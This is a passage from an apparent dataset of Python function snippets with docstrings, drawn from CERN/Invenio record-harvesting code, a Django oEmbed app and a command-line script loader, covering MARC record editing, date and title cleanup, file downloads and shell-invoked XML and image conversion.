            "def add_nations_field(authors_subfields):\n    \"\"\"Add correct nations field according to mapping in NATIONS_DEFAULT_MAP.\"\"\"\n    from .config import NATIONS_DEFAULT_MAP\n    result = []\n    for field in authors_subfields:\n        if field[0] == 'v':\n            values = [x.replace('.', '') for x in field[1].split(', ')]\n            possible_affs = filter(lambda x: x is not None,\n                                   map(NATIONS_DEFAULT_MAP.get, values))\n            if 'CERN' in possible_affs and 'Switzerland' in possible_affs:\n                # Don't use remove in case of multiple Switzerlands\n                possible_affs = [x for x in possible_affs\n                                 if x != 'Switzerland']\n\n            result.extend(possible_affs)\n\n    result = sorted(list(set(result)))\n\n    if result:\n        authors_subfields.extend([('w', res) for res in result])\n    else:\n        authors_subfields.append(('w', 'HUMAN CHECK'))"
        ],
        [
            "def fix_dashes(string):\n    \"\"\"Fix bad Unicode special dashes in string.\"\"\"\n    string = string.replace(u'\\u05BE', '-')\n    string = string.replace(u'\\u1806', '-')\n    string = string.replace(u'\\u2E3A', '-')\n    string = string.replace(u'\\u2E3B', '-')\n    string = unidecode(string)\n    return re.sub(r'--+', '-', string)"
        ],
        [
            "def fix_title_capitalization(title):\n    \"\"\"Try to capitalize properly a title string.\"\"\"\n    if re.search(\"[A-Z]\", title) and re.search(\"[a-z]\", title):\n        return title\n    word_list = re.split(' +', title)\n    final = [word_list[0].capitalize()]\n    for word in word_list[1:]:\n        if word.upper() in COMMON_ACRONYMS:\n            final.append(word.upper())\n        elif len(word) > 3:\n            final.append(word.capitalize())\n        else:\n            final.append(word.lower())\n    return \" \".join(final)"
        ],
        [
            "def convert_html_subscripts_to_latex(text):\n    \"\"\"Convert some HTML tags to latex equivalents.\"\"\"\n    text = re.sub(\"<sub>(.*?)</sub>\", r\"$_{\\1}$\", text)\n    text = re.sub(\"<sup>(.*?)</sup>\", r\"$^{\\1}$\", text)\n    return text"
        ],
        [
            "def download_file(from_url, to_filename=None,\n                  chunk_size=1024 * 8, retry_count=3):\n    \"\"\"Download URL to a file.\"\"\"\n    if not to_filename:\n        to_filename = get_temporary_file()\n\n    session = requests.Session()\n    adapter = requests.adapters.HTTPAdapter(max_retries=retry_count)\n    session.mount(from_url, adapter)\n    response = session.get(from_url, stream=True)\n    with open(to_filename, 'wb') as fd:\n        for chunk in response.iter_content(chunk_size):\n            fd.write(chunk)\n    return to_filename"
        ],
        [
            "def run_shell_command(commands, **kwargs):\n    \"\"\"Run a shell command.\"\"\"\n    p = subprocess.Popen(commands,\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         **kwargs)\n    output, error = p.communicate()\n    return p.returncode, output, error"
        ],
        [
            "def create_logger(name,\n                  filename=None,\n                  logging_level=logging.DEBUG):\n    \"\"\"Create a logger object.\"\"\"\n    logger = logging.getLogger(name)\n    formatter = logging.Formatter(('%(asctime)s - %(name)s - '\n                                   '%(levelname)-8s - %(message)s'))\n\n    if filename:\n        fh = logging.FileHandler(filename=filename)\n        fh.setFormatter(formatter)\n        logger.addHandler(fh)\n\n    ch = logging.StreamHandler()\n    ch.setFormatter(formatter)\n    logger.addHandler(ch)\n\n    logger.setLevel(logging_level)\n\n    return logger"
        ],
        [
            "def _do_unzip(zipped_file, output_directory):\n    \"\"\"Perform the actual uncompression.\"\"\"\n    z = zipfile.ZipFile(zipped_file)\n    for path in z.namelist():\n        relative_path = os.path.join(output_directory, path)\n        dirname, dummy = os.path.split(relative_path)\n        try:\n            if relative_path.endswith(os.sep) and not os.path.exists(dirname):\n                os.makedirs(relative_path)\n            elif not os.path.exists(relative_path):\n                dirname = os.path.join(output_directory, os.path.dirname(path))\n                if os.path.dirname(path) and not os.path.exists(dirname):\n                    os.makedirs(dirname)\n                fd = open(relative_path, \"w\")\n                fd.write(z.read(path))\n                fd.close()\n        except IOError, e:\n            raise e\n    return output_directory"
        ],
        [
            "def locate(pattern, root=os.curdir):\n    \"\"\"Locate all files matching supplied filename pattern recursively.\"\"\"\n    for path, dummy, files in os.walk(os.path.abspath(root)):\n        for filename in fnmatch.filter(files, pattern):\n            yield os.path.join(path, filename)"
        ],
        [
            "def punctuate_authorname(an):\n    \"\"\"Punctuate author names properly.\n\n    Expects input in the form 'Bloggs, J K' and will return 'Bloggs, J. K.'.\n    \"\"\"\n    name = an.strip()\n    parts = [x for x in name.split(',') if x != '']\n    ret_str = ''\n    for idx, part in enumerate(parts):\n        subparts = part.strip().split(' ')\n        for sidx, substr in enumerate(subparts):\n            ret_str += substr\n            if len(substr) == 1:\n                ret_str += '.'\n            if sidx < (len(subparts) - 1):\n                ret_str += ' '\n        if idx < (len(parts) - 1):\n            ret_str += ', '\n    return ret_str.strip()"
        ],
        [
            "def convert_date_to_iso(value):\n    \"\"\"Convert a date-value to the ISO date standard.\"\"\"\n    date_formats = [\"%d %b %Y\", \"%Y/%m/%d\"]\n    for dformat in date_formats:\n        try:\n            date = datetime.strptime(value, dformat)\n            return date.strftime(\"%Y-%m-%d\")\n        except ValueError:\n            pass\n    return value"
        ],
        [
            "def convert_date_from_iso_to_human(value):\n    \"\"\"Convert a date-value to the ISO date standard for humans.\"\"\"\n    try:\n        year, month, day = value.split(\"-\")\n    except ValueError:\n        # Not separated by \"-\". Space?\n        try:\n            year, month, day = value.split(\" \")\n        except ValueError:\n            # What gives? OK, lets just return as is\n            return value\n\n    try:\n        date_object = datetime(int(year), int(month), int(day))\n    except TypeError:\n        return value\n    return date_object.strftime(\"%d %b %Y\")"
        ],
        [
            "def convert_images(image_list):\n    \"\"\"Convert list of images to PNG format.\n\n    @param: image_list ([string, string, ...]): the list of image files\n        extracted from the tarball in step 1\n\n    @return: image_list ([str, str, ...]): The list of image files when all\n        have been converted to PNG format.\n    \"\"\"\n    png_output_contains = 'PNG image'\n    ret_list = []\n    for image_file in image_list:\n        if os.path.isdir(image_file):\n            continue\n\n        dummy1, cmd_out, dummy2 = run_shell_command('file %s', (image_file,))\n        if cmd_out.find(png_output_contains) > -1:\n            ret_list.append(image_file)\n        else:\n            # we're just going to assume that ImageMagick can convert all\n            # the image types that we may be faced with\n            # for sure it can do EPS->PNG and JPG->PNG and PS->PNG\n            # and PSTEX->PNG\n            converted_image_file = get_converted_image_name(image_file)\n            cmd_list = ['convert', image_file, converted_image_file]\n            dummy1, cmd_out, cmd_err = run_shell_command(cmd_list)\n            if cmd_err == '':\n                ret_list.append(converted_image_file)\n            else:\n                raise Exception(cmd_err)\n    return ret_list"
        ],
        [
            "def get_temporary_file(prefix=\"tmp_\",\n                       suffix=\"\",\n                       directory=None):\n    \"\"\"Generate a safe and closed filepath.\"\"\"\n    try:\n        file_fd, filepath = mkstemp(prefix=prefix,\n                                    suffix=suffix,\n                                    dir=directory)\n        os.close(file_fd)\n    except IOError, e:\n        try:\n            os.remove(filepath)\n        except Exception:\n            pass\n        raise e\n    return filepath"
        ],
        [
            "def return_letters_from_string(text):\n    \"\"\"Get letters from string only.\"\"\"\n    out = \"\"\n    for letter in text:\n        if letter.isalpha():\n            out += letter\n    return out"
        ],
        [
            "def license_is_oa(license):\n    \"\"\"Return True if license is compatible with Open Access\"\"\"\n    for oal in OA_LICENSES:\n        if re.search(oal, license):\n            return True\n    return False"
        ],
        [
            "def _crawl_elsevier_and_find_issue_xml(self):\n        \"\"\"\n        Information about the current volume, issue, etc. is available\n        in a file called issue.xml that is available in a higher directory.\n        \"\"\"\n        self._found_issues = []\n        if not self.path and not self.package_name:\n            for issue in self.conn._get_issues():\n                dirname = issue.rstrip('/issue.xml')\n                try:\n                    self._normalize_issue_dir_with_dtd(dirname)\n                    self._found_issues.append(dirname)\n                except Exception as err:\n                    register_exception()\n                    print(\"ERROR: can't normalize %s: %s\" % (dirname, err))\n        else:\n            def visit(dummy, dirname, names):\n                if \"issue.xml\" in names:\n                    try:\n                        self._normalize_issue_dir_with_dtd(dirname)\n                        self._found_issues.append(dirname)\n                    except Exception as err:\n                        register_exception()\n                        print(\"ERROR: can't normalize %s: %s\"\n                              % (dirname, err))\n            walk(self.path, visit, None)"
        ],
        [
            "def _normalize_issue_dir_with_dtd(self, path):\n        \"\"\"\n        issue.xml from Elsevier assume the existence of a local DTD.\n        This procedure install the DTDs next to the issue.xml file\n        and normalize it using xmllint in order to resolve all namespaces\n        and references.\n        \"\"\"\n        if exists(join(path, 'resolved_issue.xml')):\n            return\n        issue_xml_content = open(join(path, 'issue.xml')).read()\n        sis = ['si510.dtd', 'si520.dtd', 'si540.dtd']\n        tmp_extracted = 0\n        for si in sis:\n            if si in issue_xml_content:\n                self._extract_correct_dtd_package(si.split('.')[0], path)\n                tmp_extracted = 1\n\n        if not tmp_extracted:\n            message = \"It looks like the path \" + path\n            message += \" does not contain an si510, si520 or si540 in issue.xml file\"\n            self.logger.error(message)\n            raise ValueError(message)\n        command = [\"xmllint\", \"--format\", \"--loaddtd\",\n                   join(path, 'issue.xml'),\n                   \"--output\", join(path, 'resolved_issue.xml')]\n        dummy, dummy, cmd_err = run_shell_command(command)\n        if cmd_err:\n            message = \"Error in cleaning %s: %s\" % (\n                join(path, 'issue.xml'), cmd_err)\n            self.logger.error(message)\n            raise ValueError(message)"
        ],
        [
            "def _normalize_article_dir_with_dtd(self, path):\n        \"\"\"\n        main.xml from Elsevier assume the existence of a local DTD.\n        This procedure install the DTDs next to the main.xml file\n        and normalize it using xmllint in order to resolve all namespaces\n        and references.\n        \"\"\"\n        if exists(join(path, 'resolved_main.xml')):\n            return\n        main_xml_content = open(join(path, 'main.xml')).read()\n        arts = ['art501.dtd','art510.dtd','art520.dtd','art540.dtd']\n        tmp_extracted = 0\n        for art in arts:\n            if art in main_xml_content:\n                self._extract_correct_dtd_package(art.split('.')[0], path)\n                tmp_extracted = 1\n\n        if not tmp_extracted:\n            message = \"It looks like the path \" + path\n            message += \"does not contain an art501, art510, art520 or art540 in main.xml file\"\n            self.logger.error(message)\n            raise ValueError(message)\n        command = [\"xmllint\", \"--format\", \"--loaddtd\",\n                   join(path, 'main.xml'),\n                   \"--output\", join(path, 'resolved_main.xml')]\n        dummy, dummy, cmd_err = run_shell_command(command)\n        if cmd_err:\n            message = \"Error in cleaning %s: %s\" % (\n                join(path, 'main.xml'), cmd_err)\n            self.logger.error(message)\n            raise ValueError(message)"
        ],
        [
            "def get_publication_date(self, xml_doc):\n        \"\"\"Return the best effort start_date.\"\"\"\n        start_date = get_value_in_tag(xml_doc, \"prism:coverDate\")\n        if not start_date:\n            start_date = get_value_in_tag(xml_doc, \"prism:coverDisplayDate\")\n            if not start_date:\n                start_date = get_value_in_tag(xml_doc, 'oa:openAccessEffective')\n                if start_date:\n                    start_date = datetime.datetime.strptime(\n                        start_date, \"%Y-%m-%dT%H:%M:%SZ\"\n                    )\n                    return start_date.strftime(\"%Y-%m-%d\")\n            import dateutil.parser\n            #dateutil.parser.parse cant process dates like April-June 2016\n            start_date = re.sub('([A-Z][a-z]+)[\\s\\-][A-Z][a-z]+ (\\d{4})', \n                                r'\\1 \\2', start_date)\n            try:\n                date = dateutil.parser.parse(start_date)\n            except ValueError:\n                return ''\n            # Special case where we ignore the deduced day form dateutil\n            # in case it was not given in the first place.\n            if len(start_date.split(\" \")) == 3:\n                return date.strftime(\"%Y-%m-%d\")\n            else:\n                return date.strftime(\"%Y-%m\")\n        else:\n            if len(start_date) is 8:\n                start_date = time.strftime(\n                    '%Y-%m-%d', time.strptime(start_date, '%Y%m%d'))\n            elif len(start_date) is 6:\n                start_date = time.strftime(\n                    '%Y-%m', time.strptime(start_date, '%Y%m'))\n            return start_date"
        ],
        [
            "def extract_oembeds(text, args=None):\n    \"\"\"\n    Extract oembed resources from a block of text.  Returns a list\n    of dictionaries.\n\n    Max width & height can be specified:\n    {% for embed in block_of_text|extract_oembeds:\"400x300\" %}\n\n    Resource type can be specified:\n    {% for photo_embed in block_of_text|extract_oembeds:\"photo\" %}\n\n    Or both:\n    {% for embed in block_of_text|extract_oembeds:\"400x300xphoto\" %}\n    \"\"\"\n    resource_type = width = height = None\n    if args:\n        dimensions = args.lower().split('x')\n        if len(dimensions) in (3, 1):\n            resource_type = dimensions.pop()\n\n        if len(dimensions) == 2:\n            width, height = map(lambda x: int(x), dimensions)\n\n    client = OEmbedConsumer()\n    return client.extract(text, width, height, resource_type)"
        ],
        [
            "def do_oembed(parser, token):\n    \"\"\"\n    A node which parses everything between its two nodes, and replaces any links\n    with OEmbed-provided objects, if possible.\n\n    Supports two optional argument, which is the maximum width and height,\n    specified like so:\n\n    {% oembed 640x480 %}http://www.viddler.com/explore/SYSTM/videos/49/{% endoembed %}\n\n    and or the name of a sub tempalte directory to render templates from:\n\n    {% oembed 320x240 in \"comments\" %}http://www.viddler.com/explore/SYSTM/videos/49/{% endoembed %}\n\n    or:\n\n    {% oembed in \"comments\" %}http://www.viddler.com/explore/SYSTM/videos/49/{% endoembed %}\n\n    either of those will render templates in oembed/comments/oembedtype.html\n\n    Additionally, you can specify a context variable to drop the rendered text in:\n\n    {% oembed 600x400 in \"comments\" as var_name %}...{% endoembed %}\n    {% oembed as var_name %}...{% endoembed %}\n    \"\"\"\n    args = token.split_contents()\n    template_dir = None\n    var_name = None\n    if len(args) > 2:\n        if len(args) == 3 and args[1] == 'in':\n            template_dir = args[2]\n        elif len(args) == 3 and args[1] == 'as':\n            var_name = args[2]\n        elif len(args) == 4 and args[2] == 'in':\n            template_dir = args[3]\n        elif len(args) == 4 and args[2] == 'as':\n            var_name = args[3]\n        elif len(args) == 6 and args[4] == 'as':\n            template_dir = args[3]\n            var_name = args[5]\n        else:\n            raise template.TemplateSyntaxError(\"OEmbed either takes a single \" \\\n                \"(optional) argument: WIDTHxHEIGHT, where WIDTH and HEIGHT \" \\\n                \"are positive integers, and or an optional 'in \" \\\n                \" \\\"template_dir\\\"' argument set.\")\n        if template_dir:\n            if not (template_dir[0] == template_dir[-1] and template_dir[0] in ('\"', \"'\")):\n                raise template.TemplateSyntaxError(\"template_dir must be quoted\")\n            template_dir = template_dir[1:-1]\n\n    if len(args) >= 2 and 'x' in args[1]:\n        width, height = args[1].lower().split('x')\n        if not width and height:\n            raise template.TemplateSyntaxError(\"OEmbed's optional WIDTHxHEIGH\" \\\n                \"T argument requires WIDTH and HEIGHT to be positive integers.\")\n    else:\n        width, height = None, None\n    nodelist = parser.parse(('endoembed',))\n    parser.delete_first_token()\n    return OEmbedNode(nodelist, width, height, template_dir, var_name)"
        ],
        [
            "def do_autodiscover(parser, token):\n    \"\"\"\n    Generates a &lt;link&gt; tag with oembed autodiscovery bits for an object.\n\n    {% oembed_autodiscover video %}\n    \"\"\"\n    args = token.split_contents()\n    if len(args) != 2:\n        raise template.TemplateSyntaxError('%s takes an object as its parameter.' % args[0])\n    else:\n        obj = args[1]\n    return OEmbedAutodiscoverNode(obj)"
        ],
        [
            "def do_url_scheme(parser, token):\n    \"\"\"\n    Generates a &lt;link&gt; tag with oembed autodiscovery bits.\n\n    {% oembed_url_scheme %}\n    \"\"\"\n    args = token.split_contents()\n    if len(args) != 1:\n        raise template.TemplateSyntaxError('%s takes no parameters.' % args[0])\n    return OEmbedURLSchemeNode()"
        ],
        [
            "def parser(self):\n        \"\"\"return the parser for the current name\"\"\"\n        module = self.module\n\n        subcommands = self.subcommands\n        if subcommands:\n            module_desc = inspect.getdoc(module)\n            parser = Parser(description=module_desc, module=module)\n            subparsers = parser.add_subparsers()\n\n            for sc_name, callback in subcommands.items():\n                sc_name = sc_name.replace(\"_\", \"-\")\n                cb_desc = inspect.getdoc(callback)\n                sc_parser = subparsers.add_parser(\n                    sc_name,\n                    callback=callback,\n                    help=cb_desc\n                )\n\n        else:\n            parser = Parser(callback=self.callbacks[self.function_name], module=module)\n\n        return parser"
        ],
        [
            "def module(self):\n        \"\"\"load the module so we can actually run the script's function\"\"\"\n        # we have to guard this value because:\n        # https://thingspython.wordpress.com/2010/09/27/another-super-wrinkle-raising-typeerror/\n        if not hasattr(self, '_module'):\n            if \"__main__\" in sys.modules:\n                mod = sys.modules[\"__main__\"]\n                path = self.normalize_path(mod.__file__)\n                if os.path.splitext(path) == os.path.splitext(self.path):\n                    self._module = mod\n\n                else:\n                    # http://stackoverflow.com/questions/67631/how-to-import-a-module-given-the-full-path\n                    self._module = imp.load_source('captain_script', self.path)\n                    #self._module = imp.load_source(self.module_name, self.path)\n\n        return self._module"
        ],
        [
            "def body(self):\n        \"\"\"get the contents of the script\"\"\"\n        if not hasattr(self, '_body'):\n            self._body = inspect.getsource(self.module)\n        return self._body"
        ],
        [
            "def run(self, raw_args):\n        \"\"\"parse and import the script, and then run the script's main function\"\"\"\n        parser = self.parser\n        args, kwargs = parser.parse_callback_args(raw_args)\n\n        callback = kwargs.pop(\"main_callback\")\n        if parser.has_injected_quiet():\n            levels = kwargs.pop(\"quiet_inject\", \"\")\n            logging.inject_quiet(levels)\n\n        try:\n            ret_code = callback(*args, **kwargs)\n            ret_code = int(ret_code) if ret_code else 0\n\n        except ArgError as e:\n            # https://hg.python.org/cpython/file/2.7/Lib/argparse.py#l2374\n            echo.err(\"{}: error: {}\", parser.prog, str(e))\n            ret_code = 2\n\n        return ret_code"
        ],
        [
            "def call_path(self, basepath):\n        \"\"\"return that path to be able to call this script from the passed in\n        basename\n\n        example -- \n            basepath = /foo/bar\n            self.path = /foo/bar/che/baz.py\n            self.call_path(basepath) # che/baz.py\n\n        basepath -- string -- the directory you would be calling this script in\n        return -- string -- the minimum path that you could use to execute this script\n            in basepath\n        \"\"\"\n        rel_filepath = self.path\n        if basepath:\n            rel_filepath = os.path.relpath(self.path, basepath)\n\n        basename = self.name\n        if basename in set(['__init__.py', '__main__.py']):\n            rel_filepath = os.path.dirname(rel_filepath)\n\n        return rel_filepath"
        ],
        [
            "def parse(self):\n        \"\"\"load the script and set the parser and argument info\n\n        I feel that this is way too brittle to be used long term, I think it just\n        might be best to import the stupid module, the thing I don't like about that\n        is then we import basically everything, which seems bad?\n        \"\"\"\n        if self.parsed: return\n\n        self.callbacks = {}\n\n        # search for main and any main_* callable objects\n        regex = re.compile(\"^{}_?\".format(self.function_name), flags=re.I)\n        mains = set()\n        body = self.body\n        ast_tree = ast.parse(self.body, self.path)\n        for n in ast_tree.body:\n            if hasattr(n, 'name'):\n                if regex.match(n.name):\n                    mains.add(n.name)\n\n            if hasattr(n, 'value'):\n                ns = n.value\n                if hasattr(ns, 'id'):\n                    if regex.match(ns.id):\n                        mains.add(ns.id)\n\n            if hasattr(n, 'targets'):\n                ns = n.targets[0]\n                if hasattr(ns, 'id'):\n                    if regex.match(ns.id):\n                        mains.add(ns.id)\n\n            if hasattr(n, 'names'):\n                for ns in n.names:\n                    if hasattr(ns, 'name'):\n                        if regex.match(ns.name):\n                            mains.add(ns.name)\n\n                    if getattr(ns, 'asname', None):\n                        if regex.match(ns.asname):\n                            mains.add(ns.asname)\n\n        if len(mains) > 0:\n            module = self.module\n            for function_name in mains:\n                cb = getattr(module, function_name, None)\n                if cb and callable(cb):\n                    self.callbacks[function_name] = cb\n\n        else:\n            raise ParseError(\"no main function found\")\n\n        self.parsed = True\n        return len(self.callbacks) > 0"
        ],
        [
            "def can_run_from_cli(self):\n        \"\"\"return True if this script can be run from the command line\"\"\"\n        ret = False\n        ast_tree = ast.parse(self.body, self.path)\n        calls = self._find_calls(ast_tree, __name__, \"exit\")\n        for call in calls:\n            if re.search(\"{}\\(\".format(re.escape(call)), self.body):\n                ret = True\n                break\n\n        return ret"
        ],
        [
            "def register_field(cls, field):\n    \"\"\"\n    Handles registering the fields with the FieldRegistry and creating a \n    post-save signal for the model.\n    \"\"\"\n    FieldRegistry.add_field(cls, field)\n    \n    signals.post_save.connect(handle_save_embeds, sender=cls,\n            dispatch_uid='%s.%s.%s' % \\\n            (cls._meta.app_label, cls._meta.module_name, field.name))"
        ],
        [
            "def contribute_to_class(self, cls, name):\n        \"\"\"\n        I need a way to ensure that this signal gets created for all child\n        models, and since model inheritance doesn't have a 'contrubite_to_class'\n        style hook, I am creating a fake virtual field which will be added to\n        all subclasses and handles creating the signal\n        \"\"\"\n        super(EmbeddedMediaField, self).contribute_to_class(cls, name)\n        register_field(cls, self)\n        \n        # add a virtual field that will create signals on any/all subclasses\n        cls._meta.add_virtual_field(EmbeddedSignalCreator(self))"
        ],
        [
            "def fetch_url(url, method='GET', user_agent='django-oembed', timeout=SOCKET_TIMEOUT):\n    \"\"\"\n    Fetch response headers and data from a URL, raising a generic exception\n    for any kind of failure.\n    \"\"\"\n    sock = httplib2.Http(timeout=timeout)\n    request_headers = {\n        'User-Agent': user_agent,\n        'Accept-Encoding': 'gzip'}\n    try:\n        headers, raw = sock.request(url, headers=request_headers, method=method)\n    except:\n        raise OEmbedHTTPException('Error fetching %s' % url)\n    return headers, raw"
        ],
        [
            "def relative_to_full(url, example_url):\n    \"\"\"\n    Given a url which may or may not be a relative url, convert it to a full\n    url path given another full url as an example\n    \"\"\"\n    if re.match('https?:\\/\\/', url):\n        return url\n    domain = get_domain(example_url)\n    if domain:\n        return '%s%s' % (domain, url)\n    return url"
        ],
        [
            "def mock_request():\n    \"\"\"\n    Generate a fake request object to allow oEmbeds to use context processors.\n    \"\"\"\n    current_site = Site.objects.get_current()\n    request = HttpRequest()\n    request.META['SERVER_NAME'] = current_site.domain\n    return request"
        ],
        [
            "def load_class(path):\n    \"\"\"\n    dynamically load a class given a string of the format\n    \n    package.Class\n    \"\"\"\n    package, klass = path.rsplit('.', 1)\n    module = import_module(package)\n    return getattr(module, klass)"
        ],
        [
            "def get_record(self):\n        \"\"\"Override the base get_record.\"\"\"\n        self.update_system_numbers()\n        self.add_systemnumber(\"CDS\")\n        self.fields_list = [\n            \"024\", \"041\", \"035\", \"037\", \"088\", \"100\",\n            \"110\", \"111\", \"242\", \"245\", \"246\", \"260\",\n            \"269\", \"300\", \"502\", \"650\", \"653\", \"693\",\n            \"700\", \"710\", \"773\", \"856\", \"520\", \"500\",\n            \"980\"\n        ]\n        self.keep_only_fields()\n\n        self.determine_collections()\n        self.add_cms_link()\n        self.update_languages()\n        self.update_reportnumbers()\n        self.update_date()\n        self.update_pagenumber()\n        self.update_authors()\n        self.update_subject_categories(\"SzGeCERN\", \"INSPIRE\", \"categories_inspire\")\n        self.update_keywords()\n        self.update_experiments()\n        self.update_collaboration()\n        self.update_journals()\n        self.update_links_and_ffts()\n\n        if 'THESIS' in self.collections:\n            self.update_thesis_supervisors()\n            self.update_thesis_information()\n\n        if 'NOTE' in self.collections:\n            self.add_notes()\n\n        for collection in self.collections:\n            record_add_field(self.record,\n                             tag='980',\n                             subfields=[('a', collection)])\n        self.remove_controlfields()\n        return self.record"
        ],
        [
            "def add_cms_link(self):\n        \"\"\"Special handling if record is a CMS NOTE.\"\"\"\n        intnote = record_get_field_values(self.record, '690',\n                                          filter_subfield_code=\"a\",\n                                          filter_subfield_value='INTNOTE')\n        if intnote:\n            val_088 = record_get_field_values(self.record,\n                                              tag='088',\n                                              filter_subfield_code=\"a\")\n            for val in val_088:\n                if 'CMS' in val:\n                    url = ('http://weblib.cern.ch/abstract?CERN-CMS' +\n                           val.split('CMS', 1)[-1])\n                    record_add_field(self.record,\n                                     tag='856',\n                                     ind1='4',\n                                     subfields=[('u', url)])"
        ],
        [
            "def update_reportnumbers(self):\n        \"\"\"Handle reportnumbers. \"\"\"\n        rep_088_fields = record_get_field_instances(self.record, '088')\n        for field in rep_088_fields:\n            subs = field_get_subfields(field)\n            if '9' in subs:\n                for val in subs['9']:\n                    if val.startswith('P0') or val.startswith('CM-P0'):\n                        sf = [('9', 'CERN'), ('b', val)]\n                        record_add_field(self.record, '595', subfields=sf)\n            for key, val in field[0]:\n                if key in ['a', '9'] and not val.startswith('SIS-'):\n                    record_add_field(\n                        self.record, '037', subfields=[('a', val)])\n        record_delete_fields(self.record, \"088\")\n\n        # 037 Externals also...\n        rep_037_fields = record_get_field_instances(self.record, '037')\n        for field in rep_037_fields:\n            subs = field_get_subfields(field)\n            if 'a' in subs:\n                for value in subs['a']:\n                    if 'arXiv' in value:\n                        new_subs = [('a', value), ('9', 'arXiv')]\n                        for fld in record_get_field_instances(self.record,  '695'):\n                            for key, val in field_get_subfield_instances(fld):\n                                if key == 'a':\n                                    new_subs.append(('c', val))\n                                    break\n                        nf = create_field(subfields=new_subs)\n                        record_replace_field(self.record, '037', nf, field[4])\n            for key, val in field[0]:\n                if key in ['a', '9'] and val.startswith('SIS-'):\n                    record_delete_field(\n                        self.record, '037', field_position_global=field[4])"
        ],
        [
            "def update_keywords(self):\n        \"\"\"653 Free Keywords.\"\"\"\n        for field in record_get_field_instances(self.record, '653', ind1='1'):\n            subs = field_get_subfields(field)\n            new_subs = []\n            if 'a' in subs:\n                for val in subs['a']:\n                    new_subs.extend([('9', 'author'), ('a', val)])\n            new_field = create_field(subfields=new_subs, ind1='1')\n            record_replace_field(\n                self.record, '653', new_field, field_position_global=field[4])"
        ],
        [
            "def update_collaboration(self):\n        \"\"\"710 Collaboration.\"\"\"\n        for field in record_get_field_instances(self.record, '710'):\n            subs = field_get_subfield_instances(field)\n            for idx, (key, value) in enumerate(subs[:]):\n                if key == '5':\n                    subs.pop(idx)\n                elif value.startswith('CERN. Geneva'):\n                    subs.pop(idx)\n            if len(subs) == 0:\n                record_delete_field(self.record,\n                                    tag='710',\n                                    field_position_global=field[4])"
        ],
        [
            "def create_field(subfields=None, ind1=' ', ind2=' ', controlfield_value='',\n                 global_position=-1):\n    \"\"\"\n    Return a field created with the provided elements.\n\n    Global position is set arbitrary to -1.\n    \"\"\"\n    if subfields is None:\n        subfields = []\n\n    ind1, ind2 = _wash_indicators(ind1, ind2)\n    field = (subfields, ind1, ind2, controlfield_value, global_position)\n    _check_field_validity(field)\n    return field"
        ],
        [
            "def create_records(marcxml, verbose=CFG_BIBRECORD_DEFAULT_VERBOSE_LEVEL,\n                   correct=CFG_BIBRECORD_DEFAULT_CORRECT, parser='',\n                   keep_singletons=CFG_BIBRECORD_KEEP_SINGLETONS):\n    \"\"\"\n    Create a list of records from the marcxml description.\n\n    :returns: a list of objects initiated by the function create_record().\n              Please see that function's docstring.\n    \"\"\"\n    # Use the DOTALL flag to include newlines.\n    regex = re.compile('<record.*?>.*?</record>', re.DOTALL)\n    record_xmls = regex.findall(marcxml)\n\n    return [create_record(record_xml, verbose=verbose, correct=correct,\n            parser=parser, keep_singletons=keep_singletons)\n            for record_xml in record_xmls]"
        ],
        [
            "def create_record(marcxml=None, verbose=CFG_BIBRECORD_DEFAULT_VERBOSE_LEVEL,\n                  correct=CFG_BIBRECORD_DEFAULT_CORRECT, parser='',\n                  sort_fields_by_indicators=False,\n                  keep_singletons=CFG_BIBRECORD_KEEP_SINGLETONS):\n    \"\"\"Create a record object from the marcxml description.\n\n    Uses the lxml parser.\n\n    The returned object is a tuple (record, status_code, list_of_errors),\n    where status_code is 0 when there are errors, 1 when no errors.\n\n    The return record structure is as follows::\n\n        Record := {tag : [Field]}\n        Field := (Subfields, ind1, ind2, value)\n        Subfields := [(code, value)]\n\n    .. code-block:: none\n\n                                    .--------.\n                                    | record |\n                                    '---+----'\n                                        |\n               .------------------------+------------------------------------.\n               |record['001']           |record['909']        |record['520'] |\n               |                        |                     |              |\n        [list of fields]           [list of fields]     [list of fields]    ...\n               |                        |                     |\n               |               .--------+--+-----------.      |\n               |               |           |           |      |\n               |[0]            |[0]        |[1]       ...     |[0]\n          .----+------.  .-----+-----.  .--+--------.     .---+-------.\n          | Field 001 |  | Field 909 |  | Field 909 |     | Field 520 |\n          '-----------'  '-----+-----'  '--+--------'     '---+-------'\n               |               |           |                  |\n              ...              |          ...                ...\n                               |\n                    .----------+-+--------+------------.\n                    |            |        |            |\n                    |[0]         |[1]     |[2]         |\n          [list of subfields]   'C'      '4'          ...\n                    |\n               .----+---------------+------------------------+\n               |                    |                        |\n        ('a', 'value')              |            ('a', 'value for another a')\n                     ('b', 'value for subfield b')\n\n    :param marcxml: an XML string representation of the record to create\n    :param verbose: the level of verbosity: 0 (silent), 1-2 (warnings),\n                    3(strict:stop when errors)\n    :param correct: 1 to enable correction of marcxml syntax. Else 0.\n    :return: a tuple (record, status_code, list_of_errors), where status\n             code is 0 where there are errors, 1 when no errors\n    \"\"\"\n    if marcxml is None:\n        return {}\n    try:\n        rec = _create_record_lxml(marcxml, verbose, correct,\n                                  keep_singletons=keep_singletons)\n    except InvenioBibRecordParserError as ex1:\n        return (None, 0, str(ex1))\n\n    if sort_fields_by_indicators:\n        _record_sort_by_indicators(rec)\n\n    errs = []\n    if correct:\n        # Correct the structure of the record.\n        errs = _correct_record(rec)\n\n    return (rec, int(not errs), errs)"
        ],
        [
            "def filter_field_instances(field_instances, filter_subcode, filter_value,\n                           filter_mode='e'):\n    \"\"\"Filter the given field.\n\n    Filters given field and returns only that field instances that contain\n    filter_subcode with given filter_value. As an input for search function\n    accepts output from record_get_field_instances function. Function can be\n    run in three modes:\n\n    - 'e' - looking for exact match in subfield value\n    - 's' - looking for substring in subfield value\n    - 'r' - looking for regular expression in subfield value\n\n    Example:\n\n    record_filter_field(record_get_field_instances(rec, '999', '%', '%'),\n                        'y', '2001')\n\n    In this case filter_subcode is 'y' and filter_value is '2001'.\n\n    :param field_instances: output from record_get_field_instances\n    :param filter_subcode: name of the subfield\n    :type filter_subcode: string\n    :param filter_value: value of the subfield\n    :type filter_value: string\n    :param filter_mode: 'e','s' or 'r'\n    \"\"\"\n    matched = []\n    if filter_mode == 'e':\n        to_match = (filter_subcode, filter_value)\n        for instance in field_instances:\n            if to_match in instance[0]:\n                matched.append(instance)\n    elif filter_mode == 's':\n        for instance in field_instances:\n            for subfield in instance[0]:\n                if subfield[0] == filter_subcode and \\\n                   subfield[1].find(filter_value) > -1:\n                    matched.append(instance)\n                    break\n    elif filter_mode == 'r':\n        